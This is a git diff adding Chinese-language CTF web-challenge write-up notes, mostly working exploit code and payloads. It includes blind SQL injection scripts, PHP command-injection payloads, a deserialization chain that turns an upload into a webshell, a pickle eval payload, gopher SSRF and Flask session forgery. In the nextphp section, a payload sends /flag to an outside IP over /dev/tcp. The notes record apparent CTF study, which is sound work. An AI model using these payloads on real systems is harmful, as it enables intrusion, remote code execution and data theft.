@@ -1850,3 +1850,799 @@ $phar->stopBuffering();
 ![image](http://note.youdao.com/yws/res/1364/59BFF5912B1B447DB4EA0AD583FB5F92)
 
 转而用delete.php可能是因为download.php过滤了flag字样
+
+## mfw
+
+.git下载源码
+
+```
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+```
+
+payload: ?page=1') or system("cat templates/flag.php");//
+
+
+## web2
+
+```
+/*
+   逆向加密算法，解密$miwen就是flag
+*/
+
+function decode($str){
+    $s = base64_decode(strrev(str_rot13($str)));
+    for($a = 0; $a < strlen($s); $a++){
+        $b=substr($s,$a,1);
+        $c=ord($b)-1;
+        $b=chr($c);
+        $f=$f.$b;
+    }
+    return strrev($f);
+}
+echo decode($miwen);
+
+?> 
+
+```
+
+## asis_2019_unicorn_shop
+
+## online_tool
+
+![image](http://note.youdao.com/yws/res/1382/54EDC0DF09B64D9798DFF70779A8C18F)
+
+1.经过escapeshellarg处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+
+2.经过escapeshellcmd处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义
+
+3.最后执行的命令是` '172.17.0.2'\\'' -v -d a=1\' `，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
+
+https://blog.csdn.net/weixin_44077544/article/details/102835099
+
+## ciscn_2019_northern_china_day2_web1 Hack World
+
+第二次做这题，fuzz一下发现空格以及一些关键字被过滤，用异或，0^1=1，?id=1时返回正确response
+
+```
+import requests
+import time
+
+url = "http://172.16.4.116:8302/index.php"
+
+payload={'id':'1'}
+
+temp = ''
+for i in range(1, 2):
+    for p in range(32, 126+1):
+        payload['id'] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))={1})".format(i,p)
+        print(payload['id'])
+        html = requests.post(url,data=payload).text
+        # print(html)
+        if 'Hello' in html:
+            temp += chr(p)
+            print(temp)
+            break
+print(temp)
+```
+
+## fbctf_2019_products_manager
+
+sql约束攻击
+
+通过调节字节长度，注册超过源码规定的长度的name从而达到覆盖的效果，但是本地复现失败，在于描述字段会覆盖原有flag
+
+
+## FlatScience(攻防世界)
+
+1. login.php?debug出现源码，login.php的username存在注入点，单引号注入，这里是sqlite数据库，payload:构造usr=' union select name,sql from sqlite_master--+&pw=，在cokkie里可以看见sql原句
+
+![image](http://note.youdao.com/yws/res/1419/554A808F40374025882FC53C3E002236)
+
+2.
+usr=%27 UNION SELECT id, id from Users limit 0,1--+&pw=chybeta 查询出name,再查询出password等
+
+3. 这里的password是用sha1加密，hint提示密码藏在pdf里
+4. 写脚本爬取站点所有pdf,sha1密码碰撞
+
+```
+from cStringIO import StringIO
+from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
+from pdfminer.converter import TextConverter
+from pdfminer.layout import LAParams
+from pdfminer.pdfpage import PDFPage
+import sys
+import string
+import os
+import hashlib
+ 
+def get_pdf():
+	return [i for i in os.listdir("./") if i.endswith("pdf")]
+ 
+ 
+def convert_pdf_2_text(path):
+    rsrcmgr = PDFResourceManager()
+    retstr = StringIO()
+    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
+    interpreter = PDFPageInterpreter(rsrcmgr, device)
+    with open(path, 'rb') as fp:
+        for page in PDFPage.get_pages(fp, set()):
+            interpreter.process_page(page)
+        text = retstr.getvalue()
+    device.close()
+    retstr.close()
+    return text
+ 
+ 
+def find_password():
+	pdf_path = get_pdf()
+	for i in pdf_path:
+		print "Searching word in " + i
+		pdf_text = convert_pdf_2_text(i).split(" ")
+		for word in pdf_text:
+			sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
+			if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
+				print "Find the password :" + word
+				exit()
+ 
+if __name__ == "__main__":
+	find_password()
+```
+得出password: ThinJerboa
+
+## hitcon_2016_leaking
+
+node.js沙箱逃逸问题，node.js8.0版本前当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。
+
+```
+import requests
+import time
+url = 'http://402a95ea-15ad-46a2-be88-35e62822cb27.node3.buuoj.cn/?data=Buffer(500)'
+response = ''
+while 'flag' not in response:
+        req = requests.get(url)
+        response = req.text
+        print(req.status_code)
+        time.sleep(0.1)
+        if 'flag{' in response:
+            print(response)
+            break  
+
+```
+
+## ics-04
+
+查询用户页存在注入，查到用户名后，可以利用用户名重新注册
+
+## ics-05
+
+1.index.php源码里发现？page=index.php，存在文件包含漏洞，访问?page=php://filter/read=convert.base64-encode/resource=index.php读取源码
+
+![image](http://note.youdao.com/yws/res/1447/F73571AFA6F746308928FCEA1CDC494A)
+
+2.头部添加x-forwarded-for,当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行
+
+构造payload:?pat=/123/e&rep=system("cat+./s3chahahaDir/flag/flag.php")&sub=123
+
+## huwangbei_2018_easy_laravel
+
+https://www.cnblogs.com/tr1ple/p/11044313.html
+
+## insomniteaser_2019_l33t_hoster
+
+https://xz.aliyun.com/t/3941
+
+## wtf.sh-150
+
+路径穿透
+
+https://blog.csdn.net/qq_40884727/article/details/100598140
+
+## upload (攻防世界)
+
+1.上传的文件名存在注入，使用s'+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+'.jpg注入，这里用到了CONV，不转成数字，完全没有回显结果，所以用hex先将字符转换成16进制，然后用CONV函数将16进制转化为10进制，依次获取子串的12位，用substr截取12是因为一旦过长，会用科学计数法表示。
+
+2.依次注入显示数据库的前12位后12位，得到数据库名为web_upload
+
+3. 注入表名，s'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg，最后得到表名为hello_flag_is_here
+4. 同理得到flag
+
+
+## blgdel(攻防世界)
+
+1.扫描源码可以看见sql.txt,config.txt；
+
+2.user.php存在上传点，推荐人被填写10次才能有等级
+
+3.confi.php里过滤掉了尖括号，所以上传php不能被执行
+
+4.上传.htaccess文件，可以通过利用config里注册的master协议,来进行文件搜索.，包含成功的话，这个文件的内容会映射到test.php里面，构造htaccess文件，内容为php_value auto_append_file master://search/path=%2fhome%2f&name=flag
+
+5.再上传一个php文件，访问能看到flag位置回显到PHP上，再上传.htaccess，php_value auto_append_file /home/hiahiahia_flag
+
+
+## lctf_2018_bestphp_s_revenge
+
+https://cloud.tencent.com/developer/article/1376384
+
+## meepwn_2018_pycalx
+
+bool型回显注入
+
+1.代码审计，get_op()这个函数首先是限制运算符的有效长度为2，然后通过黑名单+，-，/，*，=，!限制了运算符的第一个字节，第二个字节没做限制。
+
+![image](http://note.youdao.com/yws/res/1519/FC38B1E666484752A049E9321A0BDB36)
+
+2.`calc_eval = str(repr(value1)) + str(op) + str(repr(value2))，repr()` 函数将对象转化为供解释器读取的形式，当传入不是数字是字符串的时候，会引入引号'，因为get_op仅仅过滤验证了第一位字符，因此我们可以在第二位引入单引号。 value1=a，value2=a，op=+'
+
+3.利用source变量，判断是否等于Flag变量，因为对value1和value2做了异或，所以value1为任意字符串
+
+构造payload：?value1=t&op=%2B%27&value2=and+source+in+FLAG%23&source=flag{
+
+```
+import string
+import requests
+import sys
+from urllib import quote
+
+if __name__ == '__main__':
+    reg_str = string.punctuation + string.ascii_lowercase + string.ascii_uppercase + string.digits
+    Flag = "flag{"
+    url = "http://172.16.4.116:4320/cgi-bin/pycalx.py?value1=t&op=%2B%27&value2=+and+source+in+FLAG%23&source=" + quote(Flag)
+    for i in range(10):
+        for x in reg_str:
+            url_t = url + quote(x)
+            html = requests.get(url_t).text
+            if 'True' in html:
+                url = url_t
+                Flag = Flag + x
+                print(Flag)
+                break
+```
+
+## meepwn_2018_pycalx2
+
+1.与上一题的唯一差别就是` op = get_op(get_value(arguments['op'].value))`，op也进行了黑名单校验，所以#不能用了
+
+2.F-strings提供了一种明确且方便的方式将python表达式嵌入到字符串中来进行格式化。`value1 = True，value2 ={source*0 if source in FLAG else 233} ，op = +f`执行代码为`'True'+f'{source*0 if source in FLAG else 233}'`
+
+```
+import string
+import requests
+import sys
+from urllib import quote
+
+if __name__ == '__main__':
+    reg_str = string.punctuation + string.ascii_lowercase + string.ascii_uppercase + string.digits
+    Flag = "flag{"
+    url = "http://172.16.4.116:4320/cgi-bin/pycalx2.py?value1=True&op=%2Bf&value2=%7Bsource*0+if+source+in+FLAG+else+233%7D&source=" + quote(Flag)
+    for i in range(10):
+        for x in reg_str:
+            url_t = url + quote(x)
+            print(url_t)
+            html = requests.get(url_t).text
+            if 'True' in html:
+                url = url_t
+                Flag = Flag + x
+                print(Flag)
+                break
+```
+
+## qwb_2019_smarthacker
+
+有1000多个php文件，每个文件里都有shell,写个脚本去探测shell的可用性，只会写单线程的，这里只正则寻找了get参数，其实还应该有post,大概跑了五分钟
+
+```
+import re
+import os
+import requests
+
+files = os.listdir('/Users/yechengcheng/Desktop/ctf_training/qwb_2019_smarthacker/files/src/')    #获取路径下的所有文件
+reg = re.compile(r'(?<=_GET\[\').*(?=\'\])')   #设置正则
+for i in files:                #从第一个文件开始
+    url = "http://172.16.4.116:8302/" + i
+    f = open("/Users/yechengcheng/Desktop/ctf_training/qwb_2019_smarthacker/files/src/"+i)        #打开这个文件
+    data = f.read()           #读取文件内容
+    f.close()                 #关闭文件
+    result = reg.findall(data)  #从文件中找到GET请求
+    for j in result:           #从第一个GET参数开始
+        payload = url + "?" + j + "=echo 123456"   ##尝试请求次路径，并执行命令
+        print(payload)
+        html = requests.get(payload)
+        if "123456" in html.text:
+            print(payload)
+            exit(1)
+```
+![image](http://note.youdao.com/yws/res/1667/02F816CD0C0E475DAB8C4652A9342AE8)
+
+
+
+## qwb_2019_upload
+
+1.源码泄露，本地复现不了，注册登录后可上传图片马，本地复现不了
+
+2.源码有这样几段，在html/application/controller路径下
+
+![image](http://note.youdao.com/yws/res/1677/C107150771D44F9AA8103E376451C301)
+
+存在反序列化和魔法函数
+
+![image](http://note.youdao.com/yws/res/1680/5C8A7AA08D544BF7A0D3861C70F5B59C)
+
+![image](http://note.youdao.com/yws/res/1682/ACCC4FAA96364636B25613DC9B611FC5)
+
+index.php是一个索引界面，我们请求过去后，反序例化我们传过去的对象来检查是否登陆
+
+在Register.php的析构函数中，主要想判断是否注册成功，没成功调用index方法
+
+Profile.php中的_call和_get方法分别是在调用不可调用方法和不可调用成员变量时怎么做
+
+这时候我们通过call去调用upload_img方法，通过控制传参来调用copy将png图片拷贝为php文件
+
+所以我们这里利用析构函数来构造，将cheeker构造为profile对象，调用起index的时候，调用了不存在的方法所以触发
+
+```
+<?php
+namespace app\web\controller; //要不然反序列化会出错，不知道对象实例化的是哪个类
+
+class Profile
+{
+    public $checker;
+    public $filename_tmp;
+    public $filename;
+    public $upload_menu;
+    public $ext;
+    public $img;
+    public $except;
+
+
+    public function __get($name)
+    {
+        return $this->except[$name];
+    }
+
+    public function __call($name, $arguments)
+    {
+        if($this->{$name}){
+            $this->{$this->{$name}}($arguments);
+        }
+    }
+
+}
+
+class Register
+{
+    public $checker;
+    public $registed;
+
+    public function __destruct()
+    {
+        if(!$this->registed){
+            $this->checker->index();
+        }
+    }
+
+}
+
+$profile = new Profile();
+$profile->except = ['index' => 'img'];//代表要是访问 index 这个变量，就会返回 img
+$profile->img = "upload_img";//img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img
+$profile->ext = "png";
+$profile->filename_tmp = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.png";
+$profile->filename = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.php";
+
+//构造一个 Register，checker 赋值为 我们上面这个 $profile，registed 赋值为 false，这样在这个对象析构时就会调用 profile 的 index 方法，再跳到 upload_img 了
+$register = new Register();
+$register->registed = false;
+$register->checker = $profile;
+
+echo urlencode(base64_encode(serialize($register)));
+
+```
+
+重置cookie,刷新会发现刚才上传的图片马变成了php后缀，然后蚁剑连接
+
+## rctf nextphp
+
+https://blog.csdn.net/qq_41809896/article/details/90384668
+
+eval可执行，?a=echo phpinfo();
+
+查看配置，scandir()可利用
+
+?a=var_dump(scandir('/var/www/html'));
+
+?a=echo get_file_contents('preload.php');
+
+![image](http://note.youdao.com/yws/res/1711/9355C4630D2C47788AF0EA4BDBDBDB09)
+
+![image](http://note.youdao.com/yws/res/1713/AE8CEDF7BD454FCA8CC1880D223C7736)
+
+构造序列化对象
+
+```
+<?php
+
+class A implements Serializable
+{
+    protected $data = [
+        'ret' => null,
+        'func' => 'FFI::cdef',
+        'arg' => 'int system(const char *command);'
+    ];
+
+    public function serialize(): string
+    {
+        return serialize($this->data);
+    }
+
+    public function unserialize($payload)
+    {
+        $this->data = unserialize($payload);
+    }
+}
+    $obj = new A;
+    $ser = serialize($obj);
+    echo $ser."\n";
+
+```
+
+最终payload为http://nextphp.2019.rctf.rois.io/?a=unserialize('C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";}}}')->__get('ret')->system('bash -c "cat /flag > /dev/tcp/167.99.105.52/8080"');
+
+不明白为什么要先序列化后再反序列化，再将ret指向bash命令，本地开启的端口也没有监听到
+
+## pwnhub_2018
+
+设计[phpjiami](https://github.com/virink/phpext_phpjiami_decode)，但是解密不成功
+
+## SCTF2018 BabySyc - Simple PHP Web
+同样涉及到php代码解密问题，phpjiami-decode搭建在Ubuntu里，但是解密不成功
+
+https://xz.aliyun.com/t/2403，这篇博客，博主就是用的这个插件解密的两题
+
+## wdb_unfinish
+
+存在注册页面，并且用户名在登录页面没有用到，在首页会原样显示，用户名存在注入
+
+```
+// 0+hex+0是为了防止丢失数据
+email=test@666.com&username=0'%2B(select hex(hex(database())))%2B'0&password=test
+//10位取一次，因为超过长度会被表示成科学计数法
+email=test@59.com&username=0'%2B(select substr(hex(hex((select * from flag))) from 1 for 10))%2B'0&password=test
+```
+
+还有一个大佬的脚本，用的盲注
+
+```
+import requests
+import re
+
+register_url = "http://124.126.19.106:49676/register.php"
+login_url = "http://124.126.19.106:49676/login.php"
+database = ""
+table_name = ""
+column_name = ""
+flag = ""
+#获取数据库名
+'''
+for i in range(1,10):
+    register_data = {
+        'email':'test@test'+ str(i),
+        'username':"0'+ascii(substr((select database()) from %d for 1))+'0"%i,
+        'password':123
+        }
+    r = requests.post(url=register_url,data=register_data)
+    login_data = {
+        'email':'test@test'+ str(i),
+        'password':123
+        }
+    r = requests.post(url=login_url,data=login_data)
+    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
+    asc = match.group(1)
+    if asc == '0':
+        break
+    database = database + chr(int(asc))
+print('database:',database)
+'''
+#获取表名
+'''
+for i in range(1,20):
+    register_data = {
+        'email':'test@test'+ str(i),
+        'username':"0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0"%i,
+        'password':123
+        }
+    r = requests.post(url=register_url,data=register_data)
+    print(r.text)
+    login_data = {
+        'email':'test@test'+ str(i),
+        'password':123
+        }
+    r = requests.post(url=login_url,data=login_data)
+    r.encoding = r.apparent_encoding
+    print(r.text)
+    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
+    asc = match.group(1)
+    if asc == '0':
+        break
+    table_name = table_name + chr(int(asc))
+print('table_name:',table_name)
+'''
+#获取flag
+for i in range(1,100):
+    register_data = {
+        'email':'test@test'+ str(i) + str(i),
+        'username':"0'+ascii(substr((select * from flag) from %d for 1))+'0"%i,
+        'password':123
+        }
+    r = requests.post(url=register_url,data=register_data)
+    login_data = {
+        'email':'test@test'+ str(i) + str(i),
+        'password':123
+        }
+    r = requests.post(url=login_url,data=login_data)
+    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
+    asc = match.group(1)
+    if asc == '0':
+        break
+    flag = flag + chr(int(asc))
+print('flag:',flag)
+```
+
+## Zhuanxv
+
+1.存在list文件夹，并且存在文件包含，访问/loadimage?fileName=../../WEB-INF/web.xml，下载文件
+
+2.读取../../WEB-INF/classes/applicationContext.xml下的文件，../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl这样下载下来
+拖下来所有的源码之后用 jd-gui就可以看源码了，存在注入
+
+![image](http://note.youdao.com/yws/res/1767/FA5D559D5B554A918441F7EB9B2A102E)
+
+
+payload: user.name=1'or''like''or''like'&user.password=aaaa
+
+相当于 from user where'1'or''like''or''like'' and password='aaa'
+
+基础知识，这里存在这样的逻辑：
+
+select 1=2 or 1=1 or 1=1 and 1=2;
+
+相当于=> select 1=2 or 1=1 or ( 1=1 and 1=2 );
+
+![image](http://note.youdao.com/yws/res/1777/580EBB632AD348DAA619C1B929E19BBA)
+
+```
+import requests
+url = "http://124.126.19.106:50461/zhuanxvlogin"
+
+def first():
+    admin_password = ""
+    for i in range(1,9):
+        for n in range(30,140):
+            guess = chr(n)
+            if guess == "_" or guess == "%":
+                continue
+            username = "aaa'\nor\n(select\nsubstring(password,"+str(i)+",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"+guess+"'\nor\n''like'"
+            data = {"user.name": username, "user.password": "a"}
+            req = requests.post(url, data=data, timeout=1000).text
+            if len(req)>5000:
+                admin_password = admin_password + guess
+                print "admin password: "+ admin_password
+                break
+    return admin_password
+def second(admin_password):
+    flag = ""
+    for i in range(1,50):
+        for n in range(30,140):
+            guess = chr(n)
+            if guess == "_" or guess == "%":
+                continue
+            username = "aa'\nor\n(select\nsubstring(welcometoourctf,"+str(i)+",1)\nfrom\nFlag)\nlike\n'"+guess+"'\nand\n''like'"
+            # 下载flag.class类，?fileName=../../WEB-INF/classes/com/cuitctf/po/Flag.class，反编译后可以发现列名为welcometoourctf
+            data = {"user.name": username, "user.password": admin_password}
+            req = requests.post(url, data=data, timeout=1000).text
+            if len(req)>5000:
+                flag = flag + guess
+                print "flag:" + flag
+                break
+admin_password = first() 
+# admin_password = '6YHN7UJM'   
+second(admin_password)
+
+```
+
+## 
+
+1.下载附件，发现邮箱没有做校验，最后执行的sql就是`select id from user where email = 'your input email'`
+![image](http://note.youdao.com/yws/res/1781/1D2960C4C98D4AC3B244455A8FC07929)
+![image](http://note.youdao.com/yws/res/1779/7C31387C8D7C434885CF8C7734C4C1B0)
+
+2.所以payload结合注入，拼接后的sql语句为`select id from user where email = 'test'/**/or/**/1=1#@test.com'`
+
+这里用到了group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])
+
+```
+import requests
+from bs4 import BeautifulSoup
+
+url = "http://124.126.19.106:53939/register"
+
+r = requests.get(url)
+soup = BeautifulSoup(r.text,"html5lib")
+token = soup.find_all(id='csrf_token')[0].get("value")
+
+notice = "Please use a different email address."
+result = ""
+
+# SEPARATOR/**/0x3c62723e，表示以<br>分割
+database = "(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"
+tables = "(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"
+columns = "(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"
+data = "(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)"
+
+
+for i in range(1,100):
+    for j in range(32,127):
+        payload = "ycc'/**/or/**/ascii(substr("+  data +",%d,1))=%d#/**/@qq.com" % (i,j)
+        post_data = {
+            'csrf_token': token,
+            'username': 'a',
+            'email':payload,
+            'password':'a',
+            'password2':'a',
+            'submit':'Register'
+        }
+        r = requests.post(url,data=post_data)
+        soup = BeautifulSoup(r.text,"html5lib")
+        token = soup.find_all(id='csrf_token')[0].get("value")
+        if notice in r.text:
+            result += chr(j)
+            print(result)
+            break
+```
+
+## love math(攻防世界)
+
+payload: $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat flag.php
+
+分析:36进制，可以带所有小写字母
+```
+base_convert(37907361743,10,36) => "hex2bin"
+dechex(1598506324) => "5f474554"
+$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
+($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
+```
+
+
+## ikum bilibili CISCN 2019
+
+1.用脚本找到v6最贵的
+
+```
+import requests
+
+for i in range(1,200):
+    url = 'http://124.126.19.106:43425/shop?page=' + str(i)
+    res = requests.get(url)
+    text = res.text
+
+    if 'lv6.png' in text:
+        print(i)
+        break
+```
+
+2. 购买时抓包，修改discount为0.000000000001，购买成功后提示/b1g_m4mber
+3. 访问提示只有admin，抓包请求头有一个jwt，base64后为自己的登录信息，用c-jwt-cracker-master跑出密码为ikun,用[在线工具](https://jwt.io/)修改ycc为admin，然后替换掉头部的jwt
+4. 查看源码下载源码，在admin.py里有一段python序列化
+![image](http://note.youdao.com/yws/res/1813/A2597ADDA5FF402FB364B10F60F7865A)
+5.运用pickle的内置函数访问flag.txt，生成的序列化字符串替换became参数
+
+```
+import pickle
+import urllib
+
+class payload(object):
+    def __reduce__(self):
+       return (eval, ("open('/flag.txt','r').read()",))
+
+a = pickle.dumps(payload())
+a = urllib.quote(a)
+print a
+```
+
+## Background_Management_System
+
+照着writeup做完才发现网站根目录是http://124.126.19.106:55757/xinan/public/，所以一开始扫描目录什么也没有
+
+![image](http://note.youdao.com/yws/res/1827/E153F4B18ED047739B7C9FFFB0BFF685)
+
+1.存在www.zip，下载源码，可以发现修改密码存在漏洞，用admin'#和123注册，登录后修改密码，然后用admin和123登录
+
+2.登录后提示hint,访问xinan/public/55ceedfbc97b0a81277a55506c34af36.php，接受参数url
+
+3.源码在shell.php，cat  55ceedfbc97b0a81277a55506c34af36.php能看见限制了gopher协议
+
+![image](http://note.youdao.com/yws/res/1844/BA1C13BD4BD74025A54C8340D57A8A02)
+
+![image](http://note.youdao.com/yws/res/1839/22C56E58C43B435EA38E3B5592341882)
+
+最终payload:
+
+http://124.126.19.106:51252/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=cat%2B/flag
+
+
+## email
+1.先用邮箱注册一个账号，注册时email有注入，输入123@qq.com'报错，payload为post： username=dwedwqewqddwqwdwqdwe&mail=123@qq.com' or '1'='1&passwd=123，提示User or Mail Already Registered
+
+2.盲注，writeup用的sqlmap我没跑出来，并且writeup有提示是sqlite数据库，所以一开始的sql没爆出来表名
+
+```
+import string
+import random
+import requests
+
+if __name__ == "__main__":
+
+    allchars = string.ascii_letters + string.ascii_uppercase + string.digits + '$'
+    passwd = '123'
+    #爆破表,sqlite数据库
+    mail = '123@qq.com' + "' or substr((select name from sqlite_master where type='table' limit 1,1),{},1)='{}"
+    # 爆破列，sqlite3:PRAGMA table_info('users');以换行形式输出
+    # 爆破密码，h4ck4fun
+    # mail = '123@qq.com' + "' or substr((select passwd from users where username='admin'),{},1)='{}"
+
+
+    password = ''
+    cookies = 'PHPSESSID=obpfiog3p0en2ruhieokft5la4; ScanLoginKey=5eb502407a7a2; username=admin'
+    cookies2 = dict(map(lambda x:x.split('='),cookies.split(";")))
+    # print(cookies2)
+    for i in range(1,50):
+        for c in allchars:
+            ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 12))
+            this_payload = {
+                'username': ran_str,
+                'passwd': passwd,
+                'mail': mail.format(i,c)
+            }
+            res = requests.post('http://124.126.19.106:32486/user/register/',cookies=cookies2, data=this_payload)
+            # print(this_payload)
+            # print(res.text)
+            if 'User or Mail Already Registered' in res.text:
+                password = password + c
+                print(password)
+                break
+
+        if c == '$':
+            print('finish')
+            break
+```
+
+3.登录后提示if session['isadmin']: return flag,修改邮箱存在格式化字符串漏洞，输入{user}有回显，最终payload为{user.__class__.__init__.__globals__[current_app].config}，查看源码里的secret_key，使用key生成新的cookie，然后替换cookie
+
+[flask的session伪造](https://github.com/noraj/flask-session-cookie-manager)
+
+```
+from flask.sessions import SecureCookieSessionInterface
+import traceback
+import ast
+
+class MockApp(object):
+    def __init__(self, secret_key):
+        self.secret_key = secret_key
+
+def encode(secret_key, session_cookie_structure):
+    try:
+        app = MockApp(secret_key)
+        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+        si = SecureCookieSessionInterface()
+        s = si.get_signing_serializer(app)
+        return s.dumps(session_cookie_structure)
+    except Exception as e:
+        traceback.print_exc()
+        raise Exception, "error"
+        return False
+
+if __name__ == "__main__":
+    payload = "{'isadmin': 1, 'user': (1, 'admin', 'admin@qq.com')}"
+    key = '6cfe0f4d060c99a465a09d6fc98294d8'
+    print(encode(key, payload))
+```
